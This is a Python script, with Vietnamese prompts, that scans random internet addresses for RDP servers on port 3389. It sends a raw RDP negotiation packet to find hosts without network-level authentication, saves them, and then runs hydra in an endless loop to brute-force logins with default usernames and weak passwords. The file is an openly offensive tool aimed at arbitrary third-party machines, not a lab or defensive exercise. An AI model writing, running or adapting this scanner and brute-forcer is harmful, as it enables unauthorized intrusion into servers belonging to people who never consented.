import random
import socket
import threading
import os

class BruteForceVPS:
    def __init__(self, username="username.txt", password="password.txt", targets_ip_path="targets.txt", hydra_output="hydra_output.txt"):
        print(f"Lời nhắc: các mục tiêu đã tấn công thành công được lưu vào tệp {hydra_output}")
        if os.path.exists(username) == False:
            with open(file=username, mode="a", encoding="utf-8") as file:
                for user in ["John\n", "Administrator\n", "Aaron"]:
                    file.write(user)
        if os.path.exists(password) == False:
            with open(file=password, mode="a", encoding="utf-8") as file:
                for user in ["12345\n", "Aa123456\n", "Aa123456@"]:
                    file.write(user)
        self.username = username
        self.password = password
        self.hydra_output = hydra_output
        self.targets_ip_path = targets_ip_path
        self.ip_log = []

    def random_ip(self):
        while True:
            g1 = str(random.choice([i for i in range(253)]))
            g2 = str(random.choice([i for i in range(253)]))
            g3 = str(random.choice([i for i in range(253)]))
            g4 = str(random.choice([i for i in range(253)]))
            return f"{g1}.{g2}.{g3}.{g4}"

    def check_rdp(self):
        try:
            ip = self.random_ip()
            session = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            session.settimeout(1)
            check_result = session.connect_ex((ip, 3389))
            if check_result == 0 and ip not in self.ip_log:
                self.ip_log.append(ip)
                session.send(b"\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00")
                response = session.recv(1024)
                filter_rdp_non_verify = [b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x1f\x08\x00\x02\x00\x00\x00",
                                        b"\x03\x00\x00\x13\x0e\xd0\x00\x00\x124\x00\x02\x0f\x08\x00\x02\x00\x00\x00"]
                if response in filter_rdp_non_verify:
                    print(f"đã tìm thấy mục tiêu {ip}")
                    with open(self.targets_ip_path, "a", encoding="utf-8") as file:
                        file.write(f"{ip}\n")
        except:
            pass

    def multi_thread_scan(self, thread_num):
        threads = []
        for _ in range(thread_num):
            thread = threading.Thread(target=self.check_rdp)
            thread.start()
            threads.append(thread)
        for t in threads:
            t.join()
    
    def hydra_attack(self, hydra_thread=1):
        os.system(f"hydra -t {hydra_thread} -l {self.username} -p {self.password} -M {self.targets_ip_path} -o {self.hydra_output} rdp")
    
    def clean_hydra_output(self):
        with open(file=self.hydra_output, mode="r", encoding="utf-8") as file:
            hydra_outut = file.read().splitlines()
        clear_except = []
        for o in hydra_outut:
            if o.split()[0] not in "#":
                clear_except.append(f"{o}\n")
        
        with open(file=self.hydra_output, mode="w", encoding="utf-8") as file:
            file.write("")

        with open(file=self.hydra_output, mode="a", encoding="utf-8") as file:
            for tar_op in clear_except:
                file.write(tar_op)

    def run(self, num_thread):
        while True:
            if os.path.exists(self.targets_ip_path) == True:
                os.remove(self.targets_ip_path)
            print("bắt đầu tìm kiếm mục tiêu")
            self.multi_thread_scan(thread_num=num_thread)
            print("bắt đầu tấn công")
            self.hydra_attack()
            if os.path.exists(self.hydra_output) == True:
                try:
                    self.clean_hydra_output()
                except Exception as e:
                    print(f"lỗi ở xử lý tệp {self.hydra_output} : {e}")
                    continue

num_thread = int(input("nhập số luồng : "))
brute = BruteForceVPS()
brute.run(num_thread=num_thread)
